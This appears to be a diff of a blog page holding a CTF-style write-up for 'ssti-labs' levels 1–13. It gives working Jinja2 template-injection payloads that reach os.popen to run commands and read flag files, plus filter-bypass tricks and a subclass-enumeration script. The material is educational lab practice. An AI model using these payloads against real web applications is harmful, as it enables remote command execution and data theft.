@@ -24,7 +24,7 @@
 
   
 
-  <title>ssti-labs | 逃离失眠</title>
+  <title>ssti-labs | Ins0mn1a</title>
 
   
 
@@ -58,7 +58,7 @@
     <div class="navbar-logo">
       <a href="/">
         
-          逃离失眠
+          Ins0mn1a
         
       </a>
     </div>
@@ -110,7 +110,7 @@
           
             <h2 class="last-time">
               <span>最后更新于</span>
-              <time  class="article-updated" datetime="2024-12-06T03:23:38.221Z" itemprop="dateUpdated">2024-12-06</time>
+              <time  class="article-updated" datetime="2024-12-06T07:51:07.494Z" itemprop="dateUpdated">2024-12-06</time>
             </h2>
           
           
@@ -118,6 +118,8 @@
   
 </ul>
           <ul class="wrap-list dark">
+  
+    <li><a href="/tags/SSTI/">🏷️ SSTI</a></li>
   
 </ul>
         </div>
@@ -141,56 +143,56 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h1>Level 1</h1>
+        <h1><span id="level-1">Level 1</span></h1>
 <p>正常弄，一把梭</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125; # 查看类</span><br><span class="line">&#123;&#123;().__class__.__mro__[1]&#125;&#125; # 用 object 类</span><br><span class="line">&#123;&#123;().__class__.__mro__[1].__subclasses__()[133]&#125;&#125; # 用到子类os.wrap_close</span><br><span class="line">&#123;&#123;().__class__.__mro__[1].__subclasses__()[133].__init__.__globals__&#125;&#125; # 查看该子类的全局命名空间</span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls&#x27;).read()&#125;&#125; # 用popen执行命令</span><br></pre></td></tr></table></figure>
 <p>附上子类下标显示代码：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node5.anna.nssctf.cn:20542/level/1&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;code&#x27;</span>: <span class="string">&#x27;&#123;&#123;().__class__.__mro__[1].__subclasses__()&#125;&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">decoded_text = html.unescape(response.text)</span><br><span class="line">class_names = re.findall(<span class="string">r&quot;&lt;class &#x27;([^&#x27;]+?)&#x27;&gt;&quot;</span>, decoded_text)</span><br><span class="line"><span class="keyword">for</span> _, class_name <span class="keyword">in</span> <span class="built_in">enumerate</span>(class_names):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;class_name&#125;</span>&quot;</span>)</span><br><span class="line">    i = i + <span class="number">1</span></span><br></pre></td></tr></table></figure>
-<h1>Level 2</h1>
-<p>过滤了<code>&#123;&#123;&#125;&#125;</code>，那么就考虑<code>&#123;%`绕过。`&#123;%%&#125;</code>中的语句会直接执行，不会回显，所以需要用到像print函数等来进行输出</p>
+<h1><span id="level-2">Level 2</span></h1>
+<p>过滤了<code>{{}}</code>，那么就考虑<code>{%</code>绕过。<code>{%%}</code>中的语句会直接执行，不会回显，所以需要用到像print函数等来进行输出</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print(&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls&#x27;).read()) %&#125;</span><br></pre></td></tr></table></figure>
 <p>步骤跟上面差不多</p>
-<h1>Level 3</h1>
+<h1><span id="level-3">Level 3</span></h1>
 <p>这里没有过滤器，但是没有回显，可以考虑将命令输出结果写入到一个文件中。</p>
 <p>在flask中，一般情况下会将相关文件放到<code>/app</code>中，静态文件是放在<code>/static</code>下面的。</p>
 <p>不过有一个点没搞懂，为什么<code>ls</code>后输出的是根目录的信息呢？难道说它把工作目录设置到了根目录了？</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;echo `cat /app/flag` &gt;/app/static/7.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-<h1>Level 4</h1>
+<h1><span id="level-4">Level 4</span></h1>
 <p>过滤了<code>[</code>和<code>]</code>，可以利用<code>getitem</code>进行绕过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125; # 查看类</span><br><span class="line">&#123;&#123;().__class__.__mro__.__getitem__(1)&#125;&#125; # 用 object 类</span><br><span class="line">&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(133)&#125;&#125; # 用到子类os.wrap_close</span><br><span class="line">&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(133).__init__.__globals__&#125;&#125; # 查看该子类的全局命名空间</span><br><span class="line">&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(133).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;ls&#x27;).read()&#125;&#125; # 用popen执行命令</span><br></pre></td></tr></table></figure>
-<h1>Level 5</h1>
+<h1><span id="level-5">Level 5</span></h1>
 <p>过滤了<code>‘</code>和<code>“</code>，可以考虑用get传参绕过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[request.args.payload1](request.args.payload2).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">payload: url/level/5?payload1=popen&amp;payload2=ls</span><br></pre></td></tr></table></figure>
-<h1>Level 6</h1>
+<h1><span id="level-6">Level 6</span></h1>
 <p>过滤了下划线，可以考虑用进制绕过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbases\x5f\x5f&quot;][0][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[133][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&#x27;popen&#x27;](&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-<h1>Level 7</h1>
+<h1><span id="level-7">Level 7</span></h1>
 <p>过滤了<code>.</code>，可以照搬Level6</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&quot;__class__&quot;][&quot;__bases__&quot;][0][&quot;__subclasses__&quot;]()[133][&quot;__init__&quot;][&quot;__globals__&quot;][&#x27;popen&#x27;](&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-<h1>Level 8</h1>
+<h1><span id="level-8">Level 8</span></h1>
 <p>过滤了很多可用的字符串，考虑拼接绕过，也可以从Level6，Leve7搬过来</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&quot;__cl&quot;&quot;ass__&quot;][&quot;__bas&quot;&quot;es__&quot;][0][&quot;__subcla&quot;&quot;sses__&quot;]()[133][&quot;__in&quot;&quot;it__&quot;][&quot;__glo&quot;&quot;bals__&quot;][&#x27;po&#x27;&#x27;pen&#x27;](&#x27;l&#x27;&#x27;s&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-<h1>Level 9</h1>
+<h1><span id="level-9">Level 9</span></h1>
 <p>过滤了数字，考虑使用内置模版函数或者内置模板变量直接执行命令</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;g.pop.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"># 像g.pop的内置模板函数还有url_for,get_flashed_messages,cycler,joiner</span><br><span class="line"># 内置模板变量有application,config,lipsum,self,namespace</span><br></pre></td></tr></table></figure>
-<h1>Level 10</h1>
+<h1><span id="level-10">Level 10</span></h1>
 <p>这会儿是把config设为None，表示禁止对config进行访问，而这题的目标又是让我们得到config的信息</p>
 <p>直接访问config的情况：</p>
 <p><img src="image-20241104160558093.png" alt="image-20241104160558093"></p>
 <p><img src="image-20241104160615403.png" alt="image-20241104160615403"></p>
 <p>利用内置函数或变量来访问current_app</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;g.pop.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
-<h1>Level 11</h1>
-<p>过滤了<code>’</code>，<code>“</code>，<code>+</code>，<code>request</code>，<code>.</code>，<code>[</code>，<code>]</code>，那只能另辟蹊径，用<code>&#123;%set %&#125;</code>绕过去，用attr来获取属性，getattr来获取下标；</p>
+<h1><span id="level-11">Level 11</span></h1>
+<p>过滤了<code>’</code>，<code>“</code>，<code>+</code>，<code>request</code>，<code>.</code>，<code>[</code>，<code>]</code>，那只能另辟蹊径，用<code>{%set %}</code>绕过去，用attr来获取属性，getattr来获取下标；</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">目标payload：&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(133).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;%set a=dict(__cla=a,ss__=b)|join %&#125;  # __class__</span><br><span class="line">&#123;%set b=dict(__mr=a,o__=b)|join %&#125;  # __mro__</span><br><span class="line">&#123;%set c=dict(__subcla=a,sses__=b)|join %&#125;   # __subclasses__</span><br><span class="line">&#123;%set d=dict(__ge=a,titem__=a)|join%&#125; # __getitem__</span><br><span class="line">&#123;%set e=dict(__in=a,it__=b)|join %&#125; # __init__</span><br><span class="line">&#123;%set f=dict(__glo=a,bals__=b)|join %&#125; # __globals__</span><br><span class="line">&#123;%set g=dict(pop=a,en=b)|join %&#125; # popen</span><br><span class="line">&#123;%set h=dict(l=a,s=a)|join %&#125; # ls</span><br><span class="line">&#123;%set i=dict(re=a,ad=a)|join %&#125; # read</span><br><span class="line">&#123;&#123;&#x27;&#x27;|attr(a)|attr(b)|attr(d)(1)|attr(c)|attr(d)(133)|attr(e)|attr(f)|attr(d)(g)(h)|attr(i)()&#125;&#125;</span><br><span class="line">&#123;%set a=dict(__cla=a,ss__=b)|join %&#125;&#123;%set b=dict(__mr=a,o__=b)|join %&#125;&#123;%set c=dict(__subcla=a,sses__=b)|join %&#125;&#123;%set d=dict(__ge=a,titem__=a)|join%&#125;&#123;%set e=dict(__in=a,it__=b)|join %&#125;&#123;%set f=dict(__glo=a,bals__=b)|join %&#125;&#123;%set g=dict(pop=a,en=b)|join %&#125;&#123;%set h=dict(l=a,s=a)|join %&#125;&#123;%set i=dict(re=a,ad=a)|join %&#125;&#123;&#123;()|attr(a)|attr(b)|attr(d)(1)|attr(c)()|attr(d)(133)|attr(e)|attr(f)|attr(d)(g)(h)|attr(i)()&#125;&#125;</span><br><span class="line"></span><br><span class="line">目标payload2：&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(133).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;cat /app/flag&#x27;).read()&#125;&#125;</span><br><span class="line"># 构造空格</span><br><span class="line">&#123;%set space=lipsum|string|list|attr(d)(9)%&#125;</span><br><span class="line">&#123;&#123;space&#125;&#125;</span><br><span class="line">&#123;%set cmd = (dict(cat=a)|join,space,dict(flag=a)|join)|join%&#125;</span><br><span class="line"></span><br><span class="line"># 最终payload</span><br><span class="line">&#123;%set a=dict(__cla=a,ss__=b)|join %&#125;&#123;%set b=dict(__mr=a,o__=b)|join %&#125;&#123;%set c=dict(__subcla=a,sses__=b)|join %&#125;&#123;%set d=dict(__ge=a,titem__=a)|join%&#125;&#123;%set e=dict(__in=a,it__=b)|join %&#125;&#123;%set f=dict(__glo=a,bals__=b)|join %&#125;&#123;%set g=dict(pop=a,en=b)|join %&#125;&#123;%set h=dict(l=a,s=a)|join %&#125;&#123;%set i=dict(re=a,ad=a)|join %&#125;&#123;%set space=lipsum|string|list|attr(d)(9)%&#125;&#123;%set cmd = (dict(cat=a)|join,space,dict(flag=a)|join)|join%&#125;&#123;&#123;()|attr(a)|attr(b)|attr(d)(1)|attr(c)()|attr(d)(133)|attr(e)|attr(f)|attr(d)(g)(cmd)|attr(i)()&#125;&#125;</span><br></pre></td></tr></table></figure>
-<h1>Level 12</h1>
+<h1><span id="level-12">Level 12</span></h1>
 <p>过滤了<code>_</code>，<code>.</code>，<code>0-9</code>，<code>\</code>，<code>‘</code>，<code>“</code>，<code>[</code>，<code>]</code>，可以考虑用count绕过，下划线依旧是通过构造来绕过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pop=dict(po=a,p=a)|join%&#125; # 构造 pop</span><br><span class="line">&#123;%set twentyfour=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125; # 构造24</span><br><span class="line">&#123;% set x=(()|select|string|list)|attr(pop)(twentyfour)%&#125; # 构造下划线</span><br><span class="line">&#123;%set hundred=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125; # 构造133</span><br><span class="line">&#123;%set one=dict(a=a)|join|count%&#125; # 构造1</span><br><span class="line">&#123;%set nine=dict(aaaaaaaaa=a)|join|count%&#125; # 构造9</span><br><span class="line">&#123;%set space=lipsum|string|list|attr(d)(nine)%&#125; # 构造空格</span><br><span class="line">&#123;&#123;space&#125;&#125;</span><br><span class="line">&#123;%set cmd = (dict(cat=a)|join,space,dict(flag=a)|join)|join%&#125;</span><br><span class="line"></span><br><span class="line">&#123;%set a=(x,x,dict(class=a)|join,x,x)|join %&#125;  # __class__</span><br><span class="line">&#123;%set b=(x,x,dict(mro=a)|join,x,x)|join %&#125; # __mro__</span><br><span class="line">&#123;%set c=(x,x,dict(subclasses=a)|join,x,x)|join %&#125;  # __subclasses__</span><br><span class="line">&#123;%set d=(x,x,dict(getitem=a)|join,x,x)|join %&#125; # __getitem__</span><br><span class="line">&#123;%set e=(x,x,dict(init=a)|join,x,x)|join %&#125; # __init__</span><br><span class="line">&#123;%set f=(x,x,dict(globals=a)|join,x,x)|join %&#125; # __globals__</span><br><span class="line">&#123;%set g=dict(popen=a)|join %&#125; # popen</span><br><span class="line">&#123;%set h=dict(ls=a)|join%&#125; # ls</span><br><span class="line">&#123;%set i=dict(read=a)|join %&#125; # read</span><br><span class="line"></span><br><span class="line">&#123;%set a=(x,x,dict(class=a)|join,x,x)|join %&#125;&#123;%set b=(x,x,dict(mro=a)|join,x,x)|join %&#125;&#123;%set c=(x,x,dict(subclasses=a)|join,x,x)|join %&#125;&#123;%set d=(x,x,dict(getitem=a)|join,x,x)|join %&#125;&#123;%set e=(x,x,dict(init=a)|join,x,x)|join %&#125;&#123;%set f=(x,x,dict(globals=a)|join,x,x)|join %&#125;&#123;%set g=dict(popen=a)|join %&#125;&#123;%set h=dict(ls=a)|join%&#125;&#123;%set i=dict(read=a)|join %&#125;&#123;&#123;()|attr(a)|attr(b)|attr(d)(one)|attr(c)()|attr(d)(hundred)|attr(e)|attr(f)|attr(d)(g)(h)|attr(i)()&#125;&#125; # ls</span><br><span class="line"></span><br><span class="line">&#123;%set a=(x,x,dict(class=a)|join,x,x)|join %&#125;&#123;%set b=(x,x,dict(mro=a)|join,x,x)|join %&#125;&#123;%set c=(x,x,dict(subclasses=a)|join,x,x)|join %&#125;&#123;%set d=(x,x,dict(getitem=a)|join,x,x)|join %&#125;&#123;%set space=lipsum|string|list|attr(d)(nine)%&#125;&#123;%set cmd = (dict(cat=a)|join,space,dict(flag=a)|join)|join%&#125;&#123;%set e=(x,x,dict(init=a)|join,x,x)|join %&#125;&#123;%set f=(x,x,dict(globals=a)|join,x,x)|join %&#125;&#123;%set g=dict(popen=a)|join %&#125;&#123;%set h=dict(ls=a)|join%&#125;&#123;%set i=dict(read=a)|join %&#125;&#123;%set nine=dict(aaaaaaaaa=a)|join|count%&#125;&#123;%set space=lipsum|string|list|attr(d)(nine)%&#125;&#123;%set cmd = (dict(cat=a)|join,space,dict(flag=a)|join)|join%&#125;&#123;&#123;()|attr(a)|attr(b)|attr(d)(one)|attr(c)()|attr(d)(hundred)|attr(e)|attr(f)|attr(d)(g)(cmd)|attr(i)()&#125;&#125; # cat flag</span><br></pre></td></tr></table></figure>
 <p>这里最后写乱的原因是因为构造空格的时候需要用到getitem，但是在第一个payload中，getitem的构造在空格构造的后面，所以会出现No this level的现象</p>
-<h1>Level 13</h1>
+<h1><span id="level-13">Level 13</span></h1>
 <p>过滤了<code>_</code>，<code>.</code>，<code>\</code>，<code>‘</code>，<code>“</code>，<code>[</code>，<code>]</code>，<code>+</code>，<code>request</code>，<code>class</code>，<code>init</code>，<code>arg</code>，<code>config</code>，<code>app</code>，<code>self</code></p>
 <p>拼接绕过就行，不赘述了</p>
-<h1>一些问题</h1>
+<h1><span id="一些问题">一些问题</span></h1>
 <ol>
 <li>在Level6和Level7中，引号和括号在表示基类时大有不同</li>
 </ol>
@@ -206,12 +208,12 @@
 <p>同样也被当做元素来进行处理了，不知道为什么</p>
 </blockquote>
 <ol start="2">
-<li>level11的构造空格时，payload为<code>&#123;%set space=lipsum|string|list|attr(‘pop’)(9)%&#125;</code>，在更改数字时会显示不同的字符，也并不是按照正常的ascii码表的顺序显示的</li>
+<li>level11的构造空格时，payload为<code>{%set space=lipsum|string|list|attr(‘pop’)(9)%}</code>，在更改数字时会显示不同的字符，也并不是按照正常的ascii码表的顺序显示的</li>
 </ol>
 <blockquote>
 <p>其实你把它放到模板引擎看一下就知道了</p>
 <p><img src="image-20241104203423008.png" alt="image-20241104203423008"></p>
-<p>由于lipsum是内置函数，所以它会显示这些，函数名在哪个地址下，而中间的字符串在经过<code>&#123;%set space=lipsum|string|list%&#125;</code>处理后（先将其以字符串的形式保存，然后再以列表的形式保存）就会变成这个样子</p>
+<p>由于lipsum是内置函数，所以它会显示这些，函数名在哪个地址下，而中间的字符串在经过<code>{%set space=lipsum|string|list%}</code>处理后（先将其以字符串的形式保存，然后再以列表的形式保存）就会变成这个样子</p>
 <p><img src="image-20241104203355103.png" alt="image-20241104203355103"></p>
 <p>自己数一下就会发现空格就在下标9的上面，下划线就在下标18的上面</p>
 </blockquote>
@@ -505,7 +507,7 @@
         <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
   <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
 </svg>
-        1
+        9
       </div>
     </div>
   </div>
@@ -556,7 +558,7 @@
   </div>
   <div class="widget-body">
     <div class="tags-cloud">
-      <a href="/tags/About-blog/" style="font-size: 10px;" class="tags-cloud-0">About blog</a>
+      <a href="/tags/About-blog/" style="font-size: 10px;" class="tags-cloud-0">About blog</a> <a href="/tags/BUU/" style="font-size: 15px;" class="tags-cloud-5">BUU</a> <a href="/tags/CTF/" style="font-size: 20px;" class="tags-cloud-10">CTF</a> <a href="/tags/Misc/" style="font-size: 10px;" class="tags-cloud-0">Misc</a> <a href="/tags/Myself/" style="font-size: 10px;" class="tags-cloud-0">Myself</a> <a href="/tags/SSTI/" style="font-size: 15px;" class="tags-cloud-5">SSTI</a> <a href="/tags/Upload/" style="font-size: 10px;" class="tags-cloud-0">Upload</a> <a href="/tags/Web/" style="font-size: 15px;" class="tags-cloud-5">Web</a> <a href="/tags/ctfshow/" style="font-size: 15px;" class="tags-cloud-5">ctfshow</a>
     </div>
   </div>
 </section>
